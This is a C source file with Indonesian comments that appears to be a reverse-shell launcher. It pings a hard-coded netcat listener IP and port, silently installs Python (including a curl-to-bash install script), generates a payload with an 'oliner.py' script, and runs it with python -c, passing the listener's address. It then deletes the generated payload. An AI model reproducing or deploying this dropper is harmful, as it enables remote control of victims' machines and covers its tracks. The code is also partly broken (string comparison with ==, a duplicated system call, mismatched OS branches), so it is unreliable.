#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <signal.h>
#include <stdbool.h>

#define BUFLEN 1024

typedef struct {
    char *mode;
    char *payload;
} Payload;

int check() {
    FILE *fp;
    char command[50];
    char result[10];

    snprintf(command, sizeof(command), "python.exe --version");
    fp = popen(command, "r");

    if (fp == NULL) {
        return -1;
    }

    fgets(result, sizeof(result), fp);
    pclose(fp);

    if (strstr(result, "Python") != NULL) {
        return 1;
    } else {
        return 0;
    }
}

char* readFile(const char *filename) {
    FILE *file = fopen(filename, "r");
    if (!file) {
        perror("Gagal membuka file");
        exit(EXIT_FAILURE);
    }

    fseek(file, 0, SEEK_END);
    long length = ftell(file);
    fseek(file, 0, SEEK_SET);

    char *content = malloc(length + 1);
    if (!content) {
        perror("Gagal mengalokasikan memory");
        fclose(file);
        exit(EXIT_FAILURE);
    }

    fread(content, 1, length, file);
    content[length] = '\0';
    fclose(file);

    return content;
}

bool ping(const char *ip_addr) {
    char command[BUFLEN];
    snprintf(command, sizeof(command), "ping -n 1 %s", ip_addr);

    FILE *pipe = _popen(command, "r");
    if (!pipe) {
        perror("popen");
        return false;
    }

    char buffer[BUFLEN];
    bool status = false;
    while (fgets(buffer, BUFLEN, pipe) != NULL) {
        if (strstr(buffer, "TTL=") != NULL) {
            status = true;
            break;
        }
    }

    _pclose(pipe);
    return status;
}

void notif(const char *sv, const int pr, const char *msg) {
    char command[500];
    snprintf(command, sizeof(command), "python.exe notif.py %s %d %s", sv, pr, msg);
    system(command);
    sleep(1);
}

void delete() {
    char command[150];
    snprintf(command, sizeof(command), "python.exe oliner.py -d");
    system(command);
    sleep(1);
}

void run(const char *s, const int p, const char *pload) {
    printf("\nMenjalankan payload\n");

    char *text = readFile(pload);
    if (!text) {
        fprintf(stderr, "Gagal membaca file %s\n", pload);
        return;
    }

    // printf(text);

    size_t contentLength = strlen(text);
    char *content = (char*)malloc(contentLength * 2 + 1);
    if (!content) {
        perror("Gagal mengalokasikan memori");
        free(text);
        exit(EXIT_FAILURE);
    }

    const int length = 10000000;
    size_t commandLength = strlen("python.exe -c \"\" ") + strlen(content) + strlen(s) + 20;
    if (commandLength < length) {
        commandLength = length;
    }
    char *command = (char*)malloc(commandLength * sizeof(char));
    if (!command) {
        perror("Gagal mengalokasikan memori untuk command");
        free(text);
        free(content);
        exit(EXIT_FAILURE);
    }

    snprintf(command, commandLength, "python.exe -c \"%s\" %s %d", text, s, p);
    
    system(command);
    int ret = system(command);
    if (ret == -1) {
        perror("\nGagal menjalankan perintah");
    }

    free(text);
    free(content);
    free(command);
    delete();
    sleep(1);
}

void generate(Payload *payloads, int numModes, int numPayloads, const char *s, const int p) {
    printf("\nProses generate payload\n");
    for (int i = 0; i < numModes; i++) {
        if (payloads[i].mode == "done") {
            break;
        }
        char command[150];
        snprintf(command, sizeof(command), "python.exe oliner.py %s %d %s %s %s", s, p, payloads[i].mode, payloads[i].payload, payloads[i + 1].payload);
        system(command);
        sleep(1);
    }
    printf("Generate payload selesai\n");
}

void install(const char *s, const int p) {
    printf("Install modul\n");
    char command[150];
    snprintf(command, sizeof(command), "python.exe -m pip install -r req.txt");
    system(command);
    sleep(1);
}

void handler() {
    delete();
    exit(0);
}

void exitt() {
    exit(0);
}

void os(const char *s, const int p) {
    #ifdef _WIN32
        system("powershell -Command \"& {Start-BitsTransfer -Source 'https://www.python.org/ftp/python/3.10.4/python-3.10.4-amd64.exe' -Destination 'python-installer.exe'; Start-Process 'python-installer.exe' -ArgumentList '/quiet InstallAllUsers=1 PrependPath=1' -NoNewWindow -Wait}\"");
    #elif __linux__
        system("/bin/bash -c \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)\"");
        system("brew install python");
    #elif __APPLE__
        FILE *fp;
        char result[128];
        fp = popen("which apt", "r");
        if (fp == NULL) {
            notif(s, p, "Gagal-cek-apt\n");
            return;
        }
        if (fgets(result, sizeof(result), fp) != NULL) {
            system("sudo apt update && sudo apt install -y python3");
            pclose(fp);
            return;
        }
        pclose(fp);

        fp = popen("which yum", "r");
    if (fp == NULL) {
        notif(s, p, "Gagal-cek-yum\n");
        return;
    }
    if (fgets(result, sizeof(result), fp) != NULL) {
        system("sudo yum install -y python3");
        pclose(fp);
        return;
    }
    pclose(fp);

    fp = popen("which pacman", "r");
    if (fp == NULL) {
        notif(s, p, "Gagal-cek-pacman\n");
        return;
    }
    if (fgets(result, sizeof(result), fp) != NULL) {
        system("sudo pacman -Sy python");
        pclose(fp);
        return;
    }
    pclose(fp);
    #else
        notif(s, p, "Jenis-sistem-operasi-tidak-ditemukan\n");
    #endif
}

int main() {
    signal(SIGINT, exitt);
    int python = check();
    const char *server = "172.22.239.170"; // Silahkan sesuaikan dengan IP server netcat yang diinginkan
    const int port = 8888; // Silahkan sesuaikan dengan port server netcat yang diinginkan
    const char *ploadd = "iniPAYLOADnya.py";

    if (ping(server)) {
        if (python) {
            delete();
            signal(SIGINT, handler);

            Payload payloads[] = {
                {"binary", "bahan.py"},
                {"done", "iniPAYLOADnya.py"}
            };
            int numModes = sizeof(payloads) / sizeof(payloads[0]);
            install(server, port);
            generate(payloads, numModes, numModes, server, port);
            run(server, port, ploadd);
        } else {
            os(server, port);
        }
    } else {
        printf("Mohon pastikan ip dengan benar\n");
    }

    return 0;
}